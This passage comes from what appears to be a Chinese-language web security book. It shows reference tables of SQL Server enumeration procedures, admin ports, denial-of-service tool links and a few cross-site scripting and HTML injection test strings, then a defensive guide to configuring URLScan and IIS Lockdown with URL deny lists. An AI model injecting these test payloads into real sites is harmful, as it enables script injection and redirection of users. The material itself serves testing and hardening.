<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>xp_msver</td><td style='text-align: center; word-wrap: break-word;'>列出 SQL 版本和平台信息</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>xp_enumdsn</td><td style='text-align: center; word-wrap: break-word;'>枚举 ODBC 数据源</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>xp_enumgroups</td><td style='text-align: center; word-wrap: break-word;'>枚举 Windows 组</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>xp_ntsec_enumdomains</td><td style='text-align: center; word-wrap: break-word;'>枚举网络上存在的域</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>SQL 系统表里的对象系统表对象</td><td style='text-align: center; word-wrap: break-word;'>描述</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>syscolumns</td><td style='text-align: center; word-wrap: break-word;'>当前数据库的所有字段名和存储过程，不仅仅是master</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>sysobjects</td><td style='text-align: center; word-wrap: break-word;'>数据库中的每个对象（如存储过程）</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>sysusers</td><td style='text-align: center; word-wrap: break-word;'>能操纵数据库的所有用户</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>sysfiles</td><td style='text-align: center; word-wrap: break-word;'>当前数据库及其日志文件的文件名和路径</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>systypes</td><td style='text-align: center; word-wrap: break-word;'>由 SQL 定义的数据类型，或由用户定义的新数据类型</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>默认 SQL Master 数据库表Master 数据库表</td><td style='text-align: center; word-wrap: break-word;'>描述</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>sysconfigures</td><td style='text-align: center; word-wrap: break-word;'>当前数据库配置的设置</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>sysdevices</td><td style='text-align: center; word-wrap: break-word;'>枚举用于数据库、日志和临时文件的设备</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>syslogins</td><td style='text-align: center; word-wrap: break-word;'>枚举每个有权限访问数据库用户的信息</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>sysremotologins</td><td style='text-align: center; word-wrap: break-word;'>枚举每个有权限远程访问数据库或存储过程的用户的信息</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>sysservers</td><td style='text-align: center; word-wrap: break-word;'>列出服务器可以作为 OLE 数据库服务器访问的所有对等实体</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>常用于 Web 管理的端口端口</td><td style='text-align: center; word-wrap: break-word;'>典型服务</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>21</td><td style='text-align: center; word-wrap: break-word;'>用作文件传输的 FTP</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>22</td><td style='text-align: center; word-wrap: break-word;'>用于远程管理的安全 shell（Secure Shell，SSH）</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>23</td><td style='text-align: center; word-wrap: break-word;'>用作远程管理的 Telnet</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>80</td><td style='text-align: center; word-wrap: break-word;'>万维网（World Wide Web）标准端口</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>81</td><td style='text-align: center; word-wrap: break-word;'>WWW 的备用端口</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>88</td><td style='text-align: center; word-wrap: break-word;'>WWW 的备用端口（也是 Kerberos）</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>443</td><td style='text-align: center; word-wrap: break-word;'>HTTPS</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>900</td><td style='text-align: center; word-wrap: break-word;'>IBM Websphere 管理客户端</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>2301</td><td style='text-align: center; word-wrap: break-word;'>Compaq Insight 管理器</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>2381</td><td style='text-align: center; word-wrap: break-word;'>基于 HTTPS 的 Compaq Insight 管理器</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>4242</td><td style='text-align: center; word-wrap: break-word;'>Microsoft 应用程序中心管理器</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>7001</td><td style='text-align: center; word-wrap: break-word;'>BEA Weblogic 管理</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>7002</td><td style='text-align: center; word-wrap: break-word;'>基于 SSL 的 BEA Weblogic 管理</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>7070</td><td style='text-align: center; word-wrap: break-word;'>基于 SSL 的 Sun Java Web 服务器</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>8000</td><td style='text-align: center; word-wrap: break-word;'>备用 Web 服务器或 Web 缓存</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>8001</td><td style='text-align: center; word-wrap: break-word;'>备用 Web 服务器或管理器</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>8005</td><td style='text-align: center; word-wrap: break-word;'>Apache Tomcat</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>8080</td><td style='text-align: center; word-wrap: break-word;'>备用 Web 服务器，或者 Squid 缓存控制（cachemgr.cgi），或者 Sun Java Web 服务器</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>8100</td><td style='text-align: center; word-wrap: break-word;'>Allaire JRUN</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>88x0</td><td style='text-align: center; word-wrap: break-word;'>8810, 8820, 8830 等端口，通常属于 ATG Dynamo</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>8888</td><td style='text-align: center; word-wrap: break-word;'>备用 Web 服务器</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>9090</td><td style='text-align: center; word-wrap: break-word;'>Sun Java Web 服务器管理模块</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>10,000</td><td style='text-align: center; word-wrap: break-word;'>Netscape 管理员界面（默认）</td></tr><tr><td colspan="2">拒绝服务</td></tr><tr><td colspan="2">David Dittrich 编译的拒绝服务攻 http://staff.washington.edu/dittrich/misc/ddos/击/工具</td></tr><tr><td colspan="2">拒绝服务工具和技术 http://www.antiserver.it/Denial-Of-Service/</td></tr><tr><td colspan="2">客户端分析</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>任务</td><td style='text-align: center; word-wrap: break-word;'>工具/技术</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>跨站脚本测试</td><td style='text-align: center; word-wrap: break-word;'>ScreamingCSS</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>跨站脚本测试</td><td style='text-align: center; word-wrap: break-word;'>注入 IFRAME</td></tr></table>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>跨站脚本测试</td><td style='text-align: center; word-wrap: break-word;'>注入 META REFRESH</td><td style='text-align: center; word-wrap: break-word;'>&lt;META HTTP-EQUIV=Refresh CONTENT=&quot;1;URL=http://redirect_to_here.com&quot;/&gt;</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>跨站脚本测试</td><td style='text-align: center; word-wrap: break-word;'>注入脚本元素</td><td style='text-align: center; word-wrap: break-word;'>&lt;script&gt;document.write&lt;/script&gt;</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>HTML 注入</td><td style='text-align: center; word-wrap: break-word;'>使用样式注入脚本</td><td style='text-align: center; word-wrap: break-word;'>&lt;div style=&quot;background:url(&#x27;javascript&#x27;t:alert(1))&quot;&gt;</td></tr></table>

## 附录 C URLScan 和 ModSecurity

本附录简要介绍如何安装和配置 URLScan 和 ModSecurity，它们分别是 IIS 和 Apache 的 Web 服务器防火墙。URLScan 是微软的产品，可以免费获得。ModSecurity 是 Thinking Stone 的 Ivan Ristic 的产品，可以在 GPL 许可和商业许可下使用。这两个软件都可以从本附录末尾提供的链接获得。

这里的资料根据公共可用的文档（也列在本章的末尾）改编而成，也结合了我们在使用这些工具和作为大型机构的顾问的经验。和任何技术一样，理解使用 URLScan 和 ModSecurity 的利弊非常重要，但是基本上，我们觉得如果使用得当，它们可以为 IIS 和 Apache Web 应用提供强健的保护。事实上，当 Apache 被配置成反向代理并和 ModSecurity 一起工作时，就会形成一个通用的基于网络的 Web 应用防火墙，可以用来保护任何数量的 Web 服务器。

即使你决定不使用 URLScan 和 ModSecurity，我们希望下文对它们所提供的保护机制的讨论，也能有助于你了解一些 Web 服务器安全常识。

### C.1 URLScam

URLScan 是一个模板驱动的 ISAPI 过滤器，它能截获对微软 IIS Web 服务器的请求，如果它们符合用户定义的某种标准，就拒绝这些请求。URLScan 过滤器允许管理员基于如下的标准来配置 IIS，拒绝请求：

☐ 请求方法（或者动作，比如 GET、POST、HEAD 等）。

☐ 请求资源的文件扩展名（比如.httr、printer 等）。

○ 可疑的 URL 编码，比如 IIS 目录遍历漏洞例子。

○ URL 里出现的非 ASCII 字符。

○ URL 里出现的特定字符序列。

##### ○ 请求里出现的特定头

被 URLScan 拒绝的请求可以保存在日志里，记录体一般包括拒绝原因、完整的 URL 请求和请求客户端的源 IP 地址。对于被拒绝的请求，默认情况下，客户端会接收到一个 HTTP 404 “目标没有找到” 的响应。这减少了无意中将关于服务器特征的信息泄漏给潜在攻击者的可能性。并且，URLScan 给管理员提供了删除和修改选项，管理员可以在响应中删除或者改变 “Server:” 头，这可以用来在简单的 HTTP 请求中隐藏 Web 服务器的类型和版本。

注意 在 IIS 6.0 中 微软将 URLScan 的大多数保护功能集成到 Web 服务器中。如果你运行了 IIS6 或更新的版本（并且你应该这样），在大多数情况下，不必要配置 URLScan。除非另有说明，本附录的剩余部分指的是在 IIS 5.x 或更早的版本上运行 URLScan 的情形。

如果你运行 IIS 5.x 或更早的版本，并且你想利用 URLScan 为你站点提供的强大安全性，下面是在你配置 URLScan 时必须采取的几个主要步骤：

1. 在安装 URLScan 前，确认 Windows 系列产品是最新的。

2. 下载并运行最新的 URLScan 安装程序。

3. 如果需要，根据你的需求编辑UrlScan.ini配置文件。

4. 重启 IIS

最后三个步骤能够使用 IIS Lockdown 工具自动完成。我们将在本附录中详细讨论这些步骤中的每一个步骤。我们把讨论分为初级级别和高级级别。对于只想使用 URLScan 而不关心 URLScan 究竟做了什么的读者，请阅读下一节 “URLScan 基本配置”。如果你是一个 DIY 爱好者，想知道如何手工配置 URLScan，以调整它来满足你的需求，那么请直接跳到 “URLScan 高级配置” 一节。

警告 URLs can 不会在你的系统上安装和维护最新的安全更新——你需要自己做这个工作！

### C.1.1 URLs can 基本配置（IIS5.x 和更早的版本）

配置 URLScan 的最好方法是直接从本章末尾列出的链接下载它的最新安装包，并运行。一旦配置后，只需设置 UrlScan.ini 文件，并重启 IIS 就可以使在 UrlScan.ini 文件中所做的改动生效。但是，在我们进入到 URLScan 高级配置前，让我们快速讨论另一个流行的安装 URLScan 的机制：IIS Lockdown 工具。

IIS Lockdown（IIS 5.x 和更早版本）

IIS Lockdown 工具可以从列在本章末尾的链接中获得。该工具已经有一段时间没有更新了，但是它一直是一种安全配置 IIS 5.x 和更早版本的轻松、“一站式”便捷方法。IIS

Lockdown 也包含了 URLScan（虽然是旧的版本，需要在安装后立即升级）。

运行 IIS Lockdown 会出现一个带有一些提示的向导。起先的几个选项处理本地 Internet 服务，和 URLScan 没有关系。但是，我们还是看看整个过程，因为它们是 IIS 5.x 和更早版本的最佳实践，而且为了知道 URLScan 可以安装在什么地方，你需要了解这些提示信息。

注意 如果你不清楚 IIS Lockdown 的设置对你来说是否合适，不用担心——你可以回到向导，它提供一个取消所有的更改（除了那些删除的服务！）的选项。这也会禁用（但不是卸载）URLScan。

IIS Lockdown 安装向导的第一个提示是选择一个服务器模板。模板是一个根据角色定制系统安全设置的简单方法。图 C-1 显示了可用的不同角色。

 </div>

该界面上最安全的模板是“静态 Web 服务器”，但是它对服务器设置了非常严格限制（比如，ASP 脚本无法在该模板设置的服务器上运行）。如果你的服务器仅仅运行静态 HTML 文件，这种方法是可行的。否则，你需要从列表中选择最适合服务器角色的模板。因为大多数模板都是围绕着微软的产品设计的，下面这种方法会很简单——选择你正在使用的产品。但是，请注意那些被“静态 Web 服务器”模板关闭的功能，在其他模板中并没有被禁用，这可能会导致安全问题。这是典型的安全和功能之间的折衷。

我们推荐你选择界面上的“查看模板设置”选项，如图 C-1 所示。在 IIS Lockdown 安装向导的下一界面中，就会显示一个将被启用或禁用的服务列表，如图 C-2 所示。

 </div>

这显示了根据你在前一界面所选择的模板，IIS Lockdown 将会启用和禁用的服务。通过简单地单击“下一步”按钮接受这些配置，应该是安全的，但是我们想强调一下在该界面上的“删除未选择服务”（Remove Unselected Services）选项。我们认为选中该选项来确保这些服务除了重新安装，永远不能被启用，是一个不错的主意。但是请注意，通过该界面卸载的所有服务都不能使用 IIS Lockdown 来回滚。IIS Lockdown 其他所有的设置都可以回滚，除了卸载服务——你必须手动使用正确的 Windows 安装程序，来重新安装它们。

IIS Lockdown 安装向导的下一步是指定需要禁用的脚本映射。在第 3 章中我们已经讨论过脚本映射的重要性——它们主要是提供指定的文件扩展名到服务器上的一组代码的链接，这样，当客户端请求一个具有该扩展名的文件时，他们可以运行对应的代码。这些代码模块通常是很多安全漏洞的来源，因此禁用脚本映射可以防止攻击者仅通过请求某个具有特定扩展名的文件来利用漏洞。我们建议你遵循该界面上显示的推荐的脚本映射，因为它们与你在第一步中选择的服务器模板有关。如果你对自己的任务十分了解，就可以在这里禁用更多的脚本映射。图 C-3 显示了 IIS Lockdown 安装向导中的脚本映射界面，“静态 Web 服务器”模板默认禁用了所有的映射。

IIS Lockdown 随后提示删除示例目录、删除系统工具和内容目录中文件的权限，以及禁用 WebDAV。我们推荐选择界面中的所有选项，但是请注意 WebDAV 对一些微软的产品，比如 Outlook Web Access 是必需的。如果在第一步中选择了正确的模板，这里你可以

只是接受默认值。

 </div>

最后，IIS Lockdown 向导的最后一个界面是提示安装 URLScan。这里没有提供其他的选项，如图 C-4 所示。只要确保该单选按钮被选中，然后单击“下一步”按钮。

 </div>

IIS Lockdown 随后列出你选中的所有选项，再次询问你是否希望完成安装向导。如果

你选择“下一步”，安装向导会执行你选择的所有配置，包括安装 URLScan。默认情况下，URLScan 安装在 %windir%\system32\inetsrv\urlscan 目录中，但是在你第一次配置 URLScan 之后，应该尽量避免访问这个目录。

到此刻，你的服务器已经根据你在 IIS Lockdown 中指定的设置进行了配置（这里有一些重复，但却是实现“深度防御”的良好措施）。在这一步你可以放手让服务器完成剩下的工作，但我们还是认为你应该执行另外两个步骤来确保你的服务器如愿地受到保护。首先，你应该在 URLScan 配置文件中指定一个备用的 Web 服务器名称，然后应该将 URLScan 更新到最近的版本。我们接下来将描述这些步骤。

为了指定一个备用的 Web 服务器名称，用类似 Notepad 的文本编辑器打开文件 %windir%\system32\inetsrv\urlscan\urlscan.ini，查找下面这行

AlternateServerName=

在该行的等号后面，输入你想用的任何捏造的服务器名称。这多少可以迷惑一般的攻击者或 Internet 蠕虫。

AlternateServerName=Webserver 1.0

这条语句会将你的 Web 服务器的 Bannder 改为 “Webserver 1.0”，从而防止攻击者使用我们在第 2 章中所述的 Banner 获取技术，来轻易发现你所使用的 Web 服务器的类型。一旦你做了这个改动，就需要重启 IIS 服务。你可以手动重启，或者直接进入到下一步，升级 URLScan，它会为你自动重启 IIS。如果你将这条语句设置为默认设置（比如，没有定义），并在 UrlScan.ini 的 [Options] 部分将 RemoveServerHeader 设为 1，IIS 将为每个请求返回真实的 Banner。

注意 为了重启 Windows 2000 或更新版本上的 IIS，打开命令行提示，输入 iisreset。在 Windows NT 上，可以通过输入 net stop w3svc 和 net start w3svc 来重启 WWW 服务。

为了把 URLScan 升级到最新的版本（在写本书时最新版本是 2.5），下载并运行最近的 URLScan 安装程序。安装程序会把 URLScan 的代码更新到最新的版本，对 URLScan 配置文件做必要的修改以支持新的功能（用户自定义的配置被保留下来），并重置 IIS 服务。当升级结束后，你应该看到下面的界面：

当执行 IIS Lockdown 和 URLScan 后，根据你在 IIS Lockdown 安装向导过程中选择的模板或其他选项，Web 服务器的行为会发生巨大的变化。当你尝试连接到新的加固后的服务器时，你可能会感到惊慌，因为你在浏览器里看到“对象禁用”字样——请记住，如果你选择的是“静态 Web 服务器”模板或手动禁用了 ASP 脚本映射，那么服务器将不再支持 ASP 脚本，而 ASP 脚本是 IIS 唯一提供支持的内容。

下一步做什么呢？如果某种原因你需要回滚 IIS Lockdown，请阅读接下来的小节。如果你需要更加精细地配置 URLScan，那么请阅读本章稍后的 “URLScan 高级配置” 一节。如果都不需要，那么祝贺你——你的服务器现在已经受到 URLScan 2.5 的保护了！

回滚 IIS Lockdown 那么，如果出现了一些问题，你的 Web 服务器运行了 IIS Lockdown 后，完全不能工作了，如何才能让它从 IIS Lockdown 的影响中恢复过来呢？

很简单——重新运行 iislockd.exe！在第一次运行 iislockd.exe 时，IIS Lockdown 把它做的所有配置都保存在日志文件%windir%\system32\inetsrv\oblt-log.log 中。只要该文件没有被删除或改变，在你再次运行 iislockd.exe 时，将会出现如图 C-5 所示的窗口。

 </div>

如果你选择该窗口中的“下一步”按钮，你会被再次提醒是否想要删除在你第一次运行 IIS Lockdown 时所指定的设置：

选择本界面中的“Yes”会取消 IIS Lockdown 执行的所有配置改变，并禁用 URLScan（但不会删除它，稍后需要的时候，你可以手动启用 URLScan）。请记住，如果在前面你运行 IIS Lockdown 时选择了删除服务，那么你就不能使用这种方法恢复——你必须使用正确的微软安装程序手动重新安装它们。

IIS Lockdown 自动安装 对于那些想在多个服务器上自动配置 IIS Lockdown 向导和 URLscan 的用户来说，IIS Lockdown 可以根据 iislockd.ini 文件中预定义的配置，以自动模式运行。在 iislockd.ini 中，[Info]部分包含了 IIS Lockdown 向导使用的基本配置信息。IIS Lockdown 安装包所带的 RunLockdUnattended.doc 文件解释了创建 iislockd.ini 的基本要点，并在发布包中带有一个 iislockd.ini 样例文件（不要删除或覆盖这个原始的文件，因为它包含了配置所有选项的语法！）关键的参数是在文件中设置 Unattended=TRUE，然后运行在同一目录下的 IIS Lockdown 工具，以命令行或从一个脚本中调用期望的 iislockd.ini 文件。我们使用该功能时，确实遇到过一个奇怪的结果（显示“内存不足”的错误消息），因此你使用这个功能可能会遇到一些各种各样的问题。其实，在你公司的 Web 服务器上的标准模板都使用 URLscan 也是一个不错的注意，这意味着任何新的 Web 服务器都会被自动配置成你所定义的配置。

警告 IIS Lockdown 安装程序的名称是 iislockd.exe，和这个工具自身的名字相同——不要把它们搞混了！

### C.1.2 URLs can 高级配置

本节将简单介绍UrlScan.ini里可以配置的设置。本节根据微软提供的URLScan文档改编而成，我们强烈推荐除了阅读本节外，还要阅读原始的文档，因为那里面有更完整的信息。在这里，我们的目的是提供一个快速参考，以便于读者得到对UrlScan.ini每部分含义的简短易懂的解释，同时还提供了我们对该如何设置UrlScan.ini各部分的建议。本节的内容围绕着UrlScan.ini文件的基本部分展开。

警告 我们并不推荐手动安装UrlScan.dll和/或UrlScan.ini，因为这样做可能丢失自动添加到最新安装文件中的所有新配置功能和默认设置。

#### Options 部分

每一个设置以允许的取值开始：0，1 或字符串（stiring）。

o UseAllowVerbs（0，1） 如果将其设成 1，URLScan 将拒绝所有包含了没有在 AllowVerbs 部分（大小写敏感）明确列出的 HTTP 动作的请求。如果设成 0，当请求中包含了在 DenyVerbs 部分（大小写不敏感）明确列出的 HTTP 动作，将被 URLScan 拒绝。如果设置为 1，可以获得最高的安全，而且在 AllowVerbs 部分能得到一个很短的列表，比如 GET。

o UseAllowExtensions（0, 1） 如果设成 1，当请求中包含了没有在 AllowExtensions 部分明确列出的文件扩展名时，将被 URLScan 拒绝。如果设成 0，当请求中包含了在 DenyExtensions 部分明确列出的文件扩展名时，将被 URLScan 拒绝。

AllowExtensions 和 DenyExtensions 都是大小写不敏感的，如果你希望严格控制你的 Web 站点的内容，那么把这个值设置成 1，并在 AllowExtensions 中列出正确的扩展名。更一般的情况是，对于有多种内容的站点，把这个值设置成 0，并将 DenyExtensions 设置成我们在后面 “DenyExtensions 部分” 中推荐的设置。Web 服务器一般需要的扩展名有 .asp, .aspx, .cer, .cdx, .asa, .html, .js, .htm, .jpg, .jpeg 和 .gif，在一般情况下，AllowExtensions 的列表中仅需要这些扩展。

o NormalizeUrlBeforeScan（0，1） 当设置成 1 时，允许 IIS 在 URLScan 过滤请求前把请求归一化。归一化包括对十六进制或其他编码的 URL 进行解码，正则化文件名等等。如果设置成 0，URLScan 滤除客户端发送的原始 URL。我们推荐设置成 1，从而避免像 IIS Unicode 和双解码目录遍历那样的正则化攻击。

o VerifyNormalization（0，1） 如果设置成 1，将会做归一化验证以确保请求没有被多次编码来绕过标准的归一化流程。我们推荐把这个值设置成 1。

o AllowHighBitCharacters（0，1）如果设成 0，URLScan 将拒绝所有带 ASCII 字符集之外字符的 URL 请求。该功能可以阻止 UNICODE 或 UTF-8-based 攻击，但这也会在 IIS 服务器上拒绝用非 ASCII 编码页面的正常请求。我们还是建议设成 0。

o AllowDotInPath（0, 1） 当设成 0 时，URLScan 将拒绝所有在整个 URL 中包含多个点（.）的请求。这能防范攻击者用路径信息来隐藏请求的真正扩展名（比如，像“/path/TrueURL.asp/ BogusPart.htm”这样的请求）。需要注意的是，如果你的目录名中有点号，那么包含了这些目录的请求就会被该项设置所拒绝。我们推荐设成 0。

o RemoveServerHeader（0，1） 当设成 1 时，URLScan 删除所有响应中的服务器

头，这会阻止攻击者确定运行的是什么 HTTP 服务软件。我们推荐设置成 0，并使用接下来讨论的 AlternateServerName 设置指定一个伪造的服务器头。

o AlternateServerName（字符串） 如果本设置存在而且 RemoveServerHeader 被设置成 0，IIS 把所有的响应中的默认“Server:”头替换成该字符串。如果 RemoveServerHeader 设置成 1，不会有服务器头发送给客户端，AlternateServerName 就没有意义。我们推荐设置 RemoveServerHeader=0 并在这里指定一个值，比如，AlternateServerName=Webserver 1.0。

o DenyUrlSequences（字符串）该部分列出常见的 URL 攻击符号，如果 URL 中出现与之匹配的符号，就马上拒绝该请求。这里默认的选项是 “..”，“./”，“\”，“:”，“%” 和 “&”。推荐添加到该列表的值有 “#”，“<”，“>”，“$”，“@”，“!”，“,” 和 “~”。请注意，IIS6 自动拒绝微软所提供 UrlScan.ini 文件中默认 DenyUrlSequences 部分列出的字符序列。

EnableLogging（0，1） 如果设成 1，URLScan 把它的动作记录到一个叫做UrlScan.log 的文件中，该文件被创建在UrlScan.dll 的同一目录下。如果设成 0，将不会做记录。注意 LoggingDirectory 选项可以用来指定写入 URLScan 日志的自定义位置，但该选项只在 URLScan.dll 2.5 或更新的版本上可用。我们推荐只有在 URLScan 中需要查找问题，或你想知道你的服务器经常遭受什么样的攻击时，才将这个值设置成 1。IIS 日志会详细地记录 Web 服务器的活动，除非你有很多空闲时间来检查一个繁忙服务器上 URLScan 拒绝的所有恶意请求，否则可能没有必要记录它们。

o PerProcessLogging（0, 1） 当设成 1 时，URLScan 将在日志文件名后添加包含UrlScan.dll 的 IIS 进程的 ID 号（比如，UrlScan.1664.log）。就我们所了解的情况而言，这个特性只在 IIS 6 和以上的版本上才有用，这些版本可以在多个进程上同时进行过滤。除非你运行的是 IIS 6，否则设置这个值为 0。

o PerDayLogging（0，1） 如果设置成 1，URLScan 每天创建一个新的日志文件，并在日志文件名后添加一个日期（比如，UrlScan.052202.log）。如果设置为 0，URLScan 创建一个单独的日志文件。因为除了需要查找故障时，我们不推荐记录 URLScan 拒绝的请求，因此该设置没有太大的意义。

o LogLongUrIs（0, 1）在 URLScan 2.5 中新添的功能。如果设成 1，将把在 URLScan 日志中保存的 URL 长度限制增加到 128KB。如果设成 0，那么记录项只包含 URL 的头 1024 个字节。除非资源很紧张，否则该选项应该被设置成 1（虽然我们前面推荐禁用所有的 URLScan 日志，但在你调试 URLScan，或启用了日志希望对可疑的攻击做进一步分析时，两者是不相关的）。

o AllowLateScanning（0，1）这个选项设置 URLScan 过滤器的优先级，除非你使用了 FrontPage 服务器扩展（FrontPage Server Extensions，FPSE），否则我们推荐设置成 0（高优先级）。当使用 FPSE 时，应该设置成 1，这样 FPSE 过滤器比 URLScan 的优先级更高。如果你使用的是 FPSE，也应该用 IISAdmin 把 URLScan 移到 fpexedll.dll 后面。

 $ ^{\circ} $RejectResponseUrl（字符串） 默认值为空。这个空值会发送/Rejected-By-URLScan到客户端，使客户端显示一个 HTTP 404 “对象没有找到” 页面。你可以通过“/path/file_name.ext”的格式指定一个 URL 来设置一个自定义的拒绝页面。该 URL 需要放置在本地 Web 服务器上。我们倾向于把这一项设置为空，从而使攻击者从中得不到什么信息。如果你选择创建一个自定义的 URL，你可以使用 URLScan 建立的一些特殊的服务器变量来产生一个页面，该页面带有为什么请求被拒绝的信息——更多的信息请参见 URLScan 文档。还有，请记住如果你设置了 RejectResponseUrl= /~*，URLScan 将执行所有配置的扫描并记录结果，但是它会让 IIS 接受那些在通常情况下被拒绝的页面。这种模式在你打算测试 URLScan.ini 设置又不真正地拒绝请求时，非常有用。

o UseFastPathReject（0，1） 如果设置成 1，在拒绝一个请求时，URLScan 忽略 RejectResponseUrl 的设置，给客户端返回一个简短的 404 响应（图 C-6 显示了该简单的响应）。如果该选项被启用，IIS 不能返回自定制的 404 响应或在 IIS 日志中记录请求的太多信息（URLScan 日志文件仍会包含被拒请求的完整信息）。我们推荐设置成 0，并配置你自己的定制 404。

 </div>

##### AllowVerbs 部分

如果 Options 部分中的 UseAllowVerbs 被设置成 1，URLScan 将拒绝所有包含了没有在本部分明确列出的 HTTP 动作的请求。本部分中的项目是大小写敏感的。我们建议设置

UseAllowVerbs=1，并在这里列出尽可能少的动作（如果你确定只用在这里列出 GET，那么也未尝不可！）

#### DenyVerbs 部分

如果 Options 部分中的 UseAllowVerbs 被设置成 0，URLScan 将拒绝所有包含了在本部分明确列出的 HTTP 动作（或方法）的请求。本部分中的项目是大小写不敏感的。同样，我们认为明智地使用 AllowVerbs 部分是一个更好的选择，但是如果你不能完整地列出你的应用程序用到的所有 HTTP 方法，你可能需要使用这个选项。但是，我们仍认为你应该搞清楚你所使用的方法。

##### DenyHeaders 部分

任何包含了在本部分中列出的请求头的请求都将被拒绝。本部分对大小写不敏感。

##### AllowExtensions 部分

如果在 Options 部分中 UseAllowExtensions 被设置成 1，如果请求包含的 URL 的扩展名在本部分没有明确列出，将被 URLScan 拒绝。该部分中的项目是大小写不敏感的。请注意，你可以通过在本部分放置一个单独 “.” 来指定无扩展名的请求（比如，请求一个默认页面或目录列表），像下面这个例子中的第 2 行所示。

[AllowExtensions]
.htm
.html
etc.

我们认为指定允许使用的文件扩展名，比使用 DenyExtensions 部分来拒绝不允许的文件扩展名要简单。但是这再次取决于你对自己应用程序的了解程度。

#### DenyExtensions 部分

DenyExtensions 部分包含了文件扩展名列表。如果 Options 部分中 UseAllowExtensions 被设置成了 0，任何包含了这里列出的扩展名的 URL 的请求都会被拒绝。本部分中的项目是大小写不敏感的。和 AllowExtensions 一样，你可以通过在本节中放置“.”来指定无扩展名的请求。如果你想使用本部本，我们建议你参考一下 IIS Lockdown 工具所带的 urlscan-static.ini 模板文件。它提供详细的关于 DenyExtensions 部分的设置信息。

##### RequestLimits 部分

这是 URLScan 2.5 新添的部分。RequestLimits 部分包含了下面的项目：

MaxAllowedContentLength（值）强制限制每个请求的内容长度。默认限制是 2 GB；我们建议减少到 100 KB（显然，每个应用的限制是不同，并且应该进行严格的测试）。请注意，chunked 传输编码的 POST 会避免该限制，因为它只应用到一个 POST。

MaxUrl（值）限制请求 URL 的长度，以字节为单位。请注意，查询字符串的长度不是由本设置所限制。当你使用安装程序升级 URLScan 时，默认值是 16 KB。如果手动从UrlScan.exe 提取 UrlScan.dll，那么你不需要升级 UrlScan.ini，默认设置是 260 字节。在这种情况下，你需要给 UrlScan.ini 添加 MaxUrl =16384 来改写默认设置。

MaxQueryString（值）限制查询字符串的长度，以字节为单位。默认值是 4KB。

Max[头_名称]（值）URLScan 可以通过在头的名称前添加“Max-”来对所有 HTTP 头的大小加上字节限制。举个例子，为了给“Content-Type”头添加 100 字节的限制，你可以在UrlScan.ini 中添加如下的内容：Max-Content-Type=100。对于所有没有在 RequestLimits 部分中列出的头部，都不会检查是否符合长度限制。为了列出未指定最大长度值的头部（可能是为了明确提醒管理员，该头部没有被配置），可以将这个值设置成 0。举个例子，Max-User-Agent=0。

IIS 6 请求限制设置 为什么在 IIS 6 上，URLScan 带来的好处有限呢？很多以前的 URLScan 配置，在 IIS 6 中各处都被设置了，因此 URLScan 多少有点被 IIS 6 取代了。举个例子，IIS 6 不使用刚才描述的 URLScan RequestLimits 设置，而在注册表中配置请求的大小限制，位于 HKLM\System\CurrentControlSet\Services\HTTP\Parameters。

表 C-1 简述了与安全相关的 IIS6 HTTP 注册表参数的设置，以及我们推荐的设置。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>参数</td><td style='text-align: center; word-wrap: break-word;'>限制</td><td style='text-align: center; word-wrap: break-word;'>默认值/推荐值</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>MaxFieldLength</td><td style='text-align: center; word-wrap: break-word;'>HTTP 头部长度</td><td style='text-align: center; word-wrap: break-word;'>16KB/16KB</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>MaxRequestBytes</td><td style='text-align: center; word-wrap: break-word;'>请求行的总长度，包括头部</td><td style='text-align: center; word-wrap: break-word;'>16KB/16KB</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>UrlSegmentMaxCount</td><td style='text-align: center; word-wrap: break-word;'>URL 请求的斜线个数</td><td style='text-align: center; word-wrap: break-word;'>255/100</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>UrlSegmentMaxLength</td><td style='text-align: center; word-wrap: break-word;'>URL 总的字符个数</td><td style='text-align: center; word-wrap: 